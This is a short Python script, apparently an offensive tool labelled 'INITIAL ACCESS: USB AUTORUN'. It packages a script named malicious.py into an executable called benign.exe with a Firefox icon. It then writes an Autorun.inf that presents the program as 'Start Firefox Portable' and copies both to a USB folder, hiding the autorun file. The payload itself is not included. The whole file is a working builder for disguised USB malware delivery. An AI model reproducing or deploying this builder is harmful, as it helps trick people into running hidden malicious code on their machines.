"""
INITIAL ACCESS: USB AUTORUN
TODO: FIX SOCKET ERROR? usbdir ERROR?
"""

#  We use pyinstaller to create a windows .exe installer
import PyInstaller.__main__
import shutil  # Shell
import os  # OS commands

filename = "malicious.py"  # Our code
exename = "benign.exe"  # Name of output .exe file
icon = "Firefox.ico"  # Icon of .exe file
pwd = os.getcwd()  # Get current dir
usbdir = os.path.join(pwd, "USB")  # Define dir for USB. Will work in current dir, but usb dir recommended

if os.path.isfile(exename):  # if the .exe file exists;
    os.remove(exename)  # remove it

print("creating .exe")
# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

# Create Autorun File using file-io
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")

# Move files to USB and set to hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)  # Hidden autorun file
os.system("attrib +h "+os.path.join(usbdir, "Autorun.inf"))
